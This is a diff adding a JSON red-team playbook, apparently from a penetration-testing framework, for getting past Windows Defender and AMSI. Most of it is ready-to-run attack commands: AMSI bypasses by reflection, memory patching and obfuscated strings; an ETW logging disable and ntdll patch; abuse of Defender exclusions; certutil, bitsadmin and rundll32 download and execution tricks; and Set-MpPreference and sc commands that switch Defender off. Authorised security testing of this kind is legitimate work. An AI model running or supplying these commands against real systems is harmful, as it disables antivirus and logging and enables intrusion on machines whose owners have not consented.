@@ -1,0 +1,486 @@
+{
+  "id": "windows_defender_bypass",
+  "name": "Windows Defender Bypass Techniques",
+  "description": "Bypass Windows Defender and AMSI protections for payload execution",
+  "category": "Defense Evasion",
+  "subcategory": "AV Bypass",
+  "version": "1.0",
+  "author": "Breakout Testing Framework",
+  "tags": ["windows-defender", "amsi", "bypass", "evasion", "antivirus"],
+  "triggers": [
+    {
+      "id": "windows_defender_enabled",
+      "name": "Windows Defender Enabled",
+      "description": "Trigger when Windows Defender is detected and enabled",
+      "conditions": {
+        "asset_type": "host",
+        "properties": {
+          "windows_defender_enabled": "true"
+        }
+      }
+    },
+    {
+      "id": "amsi_protection_detected",
+      "name": "AMSI Protection Detected",
+      "description": "Trigger when AMSI protection is detected",
+      "conditions": {
+        "asset_type": "securityControl",
+        "properties": {
+          "control_type": "amsi",
+          "enabled": "true"
+        }
+      }
+    }
+  ],
+  "procedures": [
+    {
+      "id": "defender_enumeration",
+      "name": "Windows Defender Enumeration",
+      "description": "Enumerate Windows Defender configuration and status",
+      "order": 1,
+      "riskLevel": "low",
+      "steps": [
+        {
+          "id": "check_defender_status",
+          "name": "Check Defender Status",
+          "description": "Verify Windows Defender real-time protection status",
+          "command": "Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, BehaviorMonitorEnabled, IoavProtectionEnabled, OnAccessProtectionEnabled",
+          "expectedOutput": "Windows Defender protection status and enabled features",
+          "timeout": 30
+        },
+        {
+          "id": "check_defender_exclusions",
+          "name": "Check Defender Exclusions",
+          "description": "List Windows Defender exclusions",
+          "command": "Get-MpPreference | Select-Object ExclusionPath, ExclusionExtension, ExclusionProcess",
+          "expectedOutput": "Configured Windows Defender exclusions",
+          "timeout": 30
+        },
+        {
+          "id": "check_defender_signatures",
+          "name": "Check Defender Signatures",
+          "description": "Check Windows Defender signature versions",
+          "command": "Get-MpComputerStatus | Select-Object *Signature*, *Update*",
+          "expectedOutput": "Defender signature versions and update status",
+          "timeout": 30
+        },
+        {
+          "id": "check_windows_security_center",
+          "name": "Check Windows Security Center",
+          "description": "Query Windows Security Center for AV status",
+          "command": "wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayName,productState,pathToSignedProductExe",
+          "expectedOutput": "Registered antivirus products and their states",
+          "timeout": 30
+        }
+      ]
+    },
+    {
+      "id": "amsi_enumeration",
+      "name": "AMSI Configuration Enumeration",
+      "description": "Enumerate AMSI providers and configuration",
+      "order": 2,
+      "riskLevel": "low",
+      "steps": [
+        {
+          "id": "check_amsi_providers",
+          "name": "Check AMSI Providers",
+          "description": "Enumerate registered AMSI providers",
+          "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers\" /s",
+          "expectedOutput": "Registered AMSI providers and their GUIDs",
+          "timeout": 30
+        },
+        {
+          "id": "test_amsi_functionality",
+          "name": "Test AMSI Functionality",
+          "description": "Test if AMSI is actively scanning",
+          "command": "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QW1zaVNjYW5CdWZmZXI='))",
+          "expectedOutput": "AMSI scan result or detection",
+          "timeout": 15
+        },
+        {
+          "id": "check_powershell_logging",
+          "name": "Check PowerShell Logging",
+          "description": "Check PowerShell script block and transcription logging",
+          "command": "reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"; reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\"",
+          "expectedOutput": "PowerShell logging configuration",
+          "timeout": 30
+        }
+      ]
+    },
+    {
+      "id": "amsi_bypass_techniques",
+      "name": "AMSI Bypass Techniques",
+      "description": "Implement various AMSI bypass methods",
+      "order": 3,
+      "riskLevel": "medium",
+      "steps": [
+        {
+          "id": "amsi_reflection_bypass",
+          "name": "AMSI Reflection Bypass",
+          "description": "Bypass AMSI using .NET reflection",
+          "command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
+          "expectedOutput": "AMSI bypass via reflection method",
+          "timeout": 30
+        },
+        {
+          "id": "amsi_memory_patch_bypass",
+          "name": "AMSI Memory Patch Bypass",
+          "description": "Bypass AMSI using memory patching",
+          "command": "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); $b=$a.GetField('amsiContext','NonPublic,Static'); $c=$b.GetValue($null); [IntPtr]$d=[IntPtr]$c; [System.Runtime.InteropServices.Marshal]::WriteInt32($d, 0x41424344)",
+          "expectedOutput": "AMSI bypass via memory patching",
+          "timeout": 30
+        },
+        {
+          "id": "amsi_string_bypass",
+          "name": "AMSI String Obfuscation Bypass",
+          "description": "Bypass AMSI using string obfuscation",
+          "command": "$s = 'System.Management.Automation.A' + 'msiUtils'; [Ref].Assembly.GetType($s).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
+          "expectedOutput": "AMSI bypass via string obfuscation",
+          "timeout": 30
+        },
+        {
+          "id": "amsi_forced_error_bypass",
+          "name": "AMSI Forced Error Bypass",
+          "description": "Force AMSI initialization error",
+          "command": "[System.Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('{5}{2}{0}{1}{3}{6}{4}' -f 'agement.Aut','omation.','n','A','i','System.Ma','ms')+'{2}{0}{1}' -f 'tl','s','Utils').GetField('{1}{2}{0}{3}' -f 'iFailed','am','siInit'),[Reflection.BindingFlags]('{2}{0}{1}' -f 'blic,Sta','tic','NonPu')).GetValue($null),0x41414141)",
+          "expectedOutput": "AMSI bypass via forced error",
+          "timeout": 30
+        }
+      ]
+    },
+    {
+      "id": "etw_bypass_techniques",
+      "name": "ETW Bypass Techniques",
+      "description": "Bypass Event Tracing for Windows (ETW)",
+      "order": 4,
+      "riskLevel": "medium",
+      "steps": [
+        {
+          "id": "etw_provider_disable",
+          "name": "ETW Provider Disable",
+          "description": "Disable ETW PowerShell provider",
+          "command": "[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)",
+          "expectedOutput": "ETW PowerShell provider disabled",
+          "timeout": 30
+        },
+        {
+          "id": "etw_patch_bypass",
+          "name": "ETW Memory Patch",
+          "description": "Patch ETW function in memory",
+          "command": "$p = [System.Diagnostics.Process]::GetCurrentProcess(); $m = $p.Modules | Where-Object {$_.ModuleName -eq 'ntdll.dll'}; $a = $m.BaseAddress.ToInt64(); $o = 0x6c6c0; [System.Runtime.InteropServices.Marshal]::WriteByte($a + $o, 0xc3)",
+          "expectedOutput": "ETW function patched in memory",
+          "timeout": 30
+        }
+      ]
+    },
+    {
+      "id": "defender_exclusion_abuse",
+      "name": "Defender Exclusion Abuse",
+      "description": "Abuse Windows Defender exclusions for payload execution",
+      "order": 5,
+      "riskLevel": "high",
+      "steps": [
+        {
+          "id": "check_existing_exclusions",
+          "name": "Check Existing Exclusions",
+          "description": "Identify existing Defender exclusions that can be abused",
+          "command": "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath; Get-MpPreference | Select-Object -ExpandProperty ExclusionExtension",
+          "expectedOutput": "Current Defender exclusions for potential abuse",
+          "timeout": 30
+        },
+        {
+          "id": "test_exclusion_paths",
+          "name": "Test Exclusion Paths",
+          "description": "Test write access to excluded paths",
+          "command": "$paths = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath; foreach($path in $paths) { if(Test-Path $path) { echo \"Accessible: $path\" } }",
+          "expectedOutput": "Accessible excluded paths for payload placement",
+          "timeout": 45
+        },
+        {
+          "id": "create_test_file_in_exclusion",
+          "name": "Create Test File in Exclusion",
+          "description": "Test file creation in excluded directory",
+          "command": "$path = (Get-MpPreference).ExclusionPath | Select-Object -First 1; if($path) { echo 'Test payload' | Out-File \"$path\\test.txt\" -Encoding ASCII; if(Test-Path \"$path\\test.txt\") { echo 'File created in exclusion successfully' } }",
+          "expectedOutput": "Test file creation in Defender exclusion",
+          "timeout": 30
+        }
+      ]
+    },
+    {
+      "id": "lolbins_execution",
+      "name": "Living Off The Land Binaries",
+      "description": "Use legitimate Windows binaries for payload execution",
+      "order": 6,
+      "riskLevel": "medium",
+      "steps": [
+        {
+          "id": "certutil_download",
+          "name": "Certutil Download Test",
+          "description": "Test file download using certutil",
+          "command": "certutil.exe -urlcache -split -f http://example.com/test.txt test.txt 2>&1 | findstr /i 'successfully\\|error'",
+          "expectedOutput": "Certutil download capability test",
+          "timeout": 60
+        },
+        {
+          "id": "regsvr32_execution",
+          "name": "Regsvr32 Execution Test",
+          "description": "Test script execution using regsvr32",
+          "command": "echo 'Testing regsvr32 scriptlet execution capability'",
+          "expectedOutput": "Regsvr32 execution method verification",
+          "timeout": 30
+        },
+        {
+          "id": "rundll32_execution",
+          "name": "Rundll32 Execution Test",
+          "description": "Test JavaScript execution using rundll32",
+          "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write(\"Rundll32 JS execution test\");close();",
+          "expectedOutput": "Rundll32 JavaScript execution test",
+          "timeout": 30
+        },
+        {
+          "id": "mshta_execution",
+          "name": "MSHTA Execution Test",
+          "description": "Test HTA execution using mshta",
+          "command": "echo 'Testing MSHTA execution capability for HTA files'",
+          "expectedOutput": "MSHTA execution method verification",
+          "timeout": 30
+        },
+        {
+          "id": "bitsadmin_download",
+          "name": "Bitsadmin Download Test",
+          "description": "Test file download using bitsadmin",
+          "command": "bitsadmin /transfer test /download /priority normal http://example.com/test.txt C:\\Windows\\Temp\\test.txt",
+          "expectedOutput": "Bitsadmin download capability test",
+          "timeout": 60
+        }
+      ]
+    },
+    {
+      "id": "powershell_evasion",
+      "name": "PowerShell Evasion Techniques",
+      "description": "Evade PowerShell monitoring and restrictions",
+      "order": 7,
+      "riskLevel": "medium",
+      "steps": [
+        {
+          "id": "execution_policy_bypass",
+          "name": "Execution Policy Bypass",
+          "description": "Bypass PowerShell execution policy",
+          "command": "powershell -ExecutionPolicy Bypass -Command \"Write-Host 'Execution Policy Bypassed'\"",
+          "expectedOutput": "PowerShell execution with bypassed policy",
+          "timeout": 30
+        },
+        {
+          "id": "encoded_command_execution",
+          "name": "Encoded Command Execution",
+          "description": "Execute base64-encoded PowerShell commands",
+          "command": "$command = 'Write-Host \"Encoded command test\"'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encoded = [Convert]::ToBase64String($bytes); powershell -EncodedCommand $encoded",
+          "expectedOutput": "Base64-encoded PowerShell command execution",
+          "timeout": 30
+        },
+        {
+          "id": "invoke_expression_obfuscation",
+          "name": "Invoke-Expression Obfuscation",
+          "description": "Use obfuscated Invoke-Expression calls",
+          "command": "$i = 'Invoke-Expression'; $cmd = 'Write-Host \"IEX obfuscation test\"'; & $i $cmd",
+          "expectedOutput": "Obfuscated Invoke-Expression execution",
+          "timeout": 30
+        },
+        {
+          "id": "alternative_powershell_hosts",
+          "name": "Alternative PowerShell Hosts",
+          "description": "Test execution in alternative PowerShell hosts",
+          "command": "powershell_ise.exe -Command \"Write-Host 'Alternative PowerShell host test'\" 2>&1 | findstr /i 'test\\|error'",
+          "expectedOutput": "Alternative PowerShell host execution test",
+          "timeout": 30
+        }
+      ]
+    },
+    {
+      "id": "defender_disable_attempts",
+      "name": "Defender Disable Attempts",
+      "description": "Attempt to disable Windows Defender (requires admin)",
+      "order": 8,
+      "riskLevel": "high",
+      "steps": [
+        {
+          "id": "check_admin_privileges",
+          "name": "Check Administrative Privileges",
+          "description": "Verify if current user has administrative privileges",
+          "command": "net session 2>&1 | findstr /i 'access\\|denied' && echo 'No admin privileges' || echo 'Administrative privileges available'",
+          "expectedOutput": "Administrative privilege status",
+          "timeout": 15
+        },
+        {
+          "id": "disable_real_time_protection",
+          "name": "Disable Real-time Protection",
+          "description": "Attempt to disable Windows Defender real-time protection",
+          "command": "Set-MpPreference -DisableRealtimeMonitoring $true 2>&1 | Out-String",
+          "expectedOutput": "Real-time protection disable attempt result",
+          "timeout": 30
+        },
+        {
+          "id": "disable_ioav_protection",
+          "name": "Disable IOAV Protection",
+          "description": "Attempt to disable IE/Office/Adobe protection",
+          "command": "Set-MpPreference -DisableIOAVProtection $true 2>&1 | Out-String",
+          "expectedOutput": "IOAV protection disable attempt result",
+          "timeout": 30
+        },
+        {
+          "id": "disable_behavior_monitoring",
+          "name": "Disable Behavior Monitoring",
+          "description": "Attempt to disable behavior monitoring",
+          "command": "Set-MpPreference -DisableBehaviorMonitoring $true 2>&1 | Out-String",
+          "expectedOutput": "Behavior monitoring disable attempt result",
+          "timeout": 30
+        },
+        {
+          "id": "stop_defender_service",
+          "name": "Stop Defender Service",
+          "description": "Attempt to stop Windows Defender service",
+          "command": "sc stop WinDefend 2>&1; sc config WinDefend start=disabled 2>&1",
+          "expectedOutput": "Defender service stop attempt result",
+          "timeout": 30
+        }
+      ]
+    }
+  ],
+  "risks": [
+    {
+      "risk": "AMSI bypass attempts may trigger advanced threat detection",
+      "mitigation": "Use AMSI bypasses judiciously and in controlled environments"
+    },
+    {
+      "risk": "ETW bypass may affect system logging and monitoring",
+      "mitigation": "Document ETW modifications and restore after testing"
+    },
+    {
+      "risk": "Defender disable attempts will generate security alerts",
+      "mitigation": "Coordinate with security team before attempting to disable Defender"
+    },
+    {
+      "risk": "LOLBins usage may be monitored by behavioral analytics",
+      "mitigation": "Use legitimate business justifications for LOLBins testing"
+    },
+    {
+      "risk": "PowerShell evasion may trigger script block logging",
+      "mitigation": "Be aware that obfuscated PowerShell may still be logged"
+    },
+    {
+      "risk": "Memory patching may cause system instability",
+      "mitigation": "Test memory modifications carefully and restore original state"
+    }
+  ],
+  "tools": [
+    {
+      "name": "PowerShell",
+      "version": "5.0+",
+      "required": true,
+      "purpose": "AMSI bypass and evasion techniques"
+    },
+    {
+      "name": "Certutil",
+      "version": "Built-in",
+      "required": true,
+      "purpose": "File download and certificate operations"
+    },
+    {
+      "name": "Regsvr32",
+      "version": "Built-in",
+      "required": true,
+      "purpose": "DLL registration and scriptlet execution"
+    },
+    {
+      "name": "Rundll32",
+      "version": "Built-in",
+      "required": true,
+      "purpose": "DLL execution and JavaScript hosting"
+    },
+    {
+      "name": "MSHTA",
+      "version": "Built-in",
+      "required": false,
+      "purpose": "HTML Application execution"
+    },
+    {
+      "name": "Bitsadmin",
+      "version": "Built-in",
+      "required": false,
+      "purpose": "Background file transfer"
+    }
+  ],
+  "equipment": [
+    {
+      "name": "Windows System Access",
+      "required": true,
+      "description": "User-level access to Windows system with Defender enabled"
+    },
+    {
+      "name": "PowerShell Access",
+      "required": true,
+      "description": "PowerShell execution capability for testing bypasses"
+    },
+    {
+      "name": "Administrative Privileges",
+      "required": false,
+      "description": "Administrative access for Defender disable attempts"
+    }
+  ],
+  "suggestedFindings": [
+    {
+      "title": "Windows Defender Configuration Enumerated",
+      "description": "Successfully identified Windows Defender status and configuration",
+      "severity": "informational",
+      "evidence": "Defender status, exclusions, signature versions, security center data"
+    },
+    {
+      "title": "AMSI Configuration Analyzed",
+      "description": "Documented AMSI providers and PowerShell logging configuration",
+      "severity": "informational",
+      "evidence": "AMSI providers, functionality tests, PowerShell logging settings"
+    },
+    {
+      "title": "AMSI Bypass Successful",
+      "description": "Successfully bypassed AMSI protection using reflection/memory patching",
+      "severity": "high",
+      "evidence": "AMSI bypass commands, successful execution without detection"
+    },
+    {
+      "title": "ETW Bypass Achieved",
+      "description": "Successfully disabled ETW PowerShell logging",
+      "severity": "medium",
+      "evidence": "ETW provider disable commands, logging suppression verification"
+    },
+    {
+      "title": "Defender Exclusion Abuse",
+      "description": "Identified and abused existing Defender exclusions for payload execution",
+      "severity": "high",
+      "evidence": "Exclusion paths, file creation in excluded directories"
+    },
+    {
+      "title": "Living Off The Land Execution",
+      "description": "Successfully executed payloads using legitimate Windows binaries",
+      "severity": "medium",
+      "evidence": "LOLBins execution tests, file downloads, script execution"
+    },
+    {
+      "title": "PowerShell Evasion Techniques",
+      "description": "Bypassed PowerShell restrictions and monitoring",
+      "severity": "medium",
+      "evidence": "Execution policy bypass, encoded commands, obfuscation techniques"
+    },
+    {
+      "title": "Windows Defender Disabled",
+      "description": "Successfully disabled Windows Defender real-time protection",
+      "severity": "critical",
+      "evidence": "Defender disable commands, protection status verification"
+    },
+    {
+      "title": "Comprehensive AV Evasion",
+      "description": "Achieved comprehensive bypass of Windows security controls",
+      "severity": "critical",
+      "evidence": "Multiple bypass techniques, sustained evasion, payload execution"
+    }
+  ]
+}
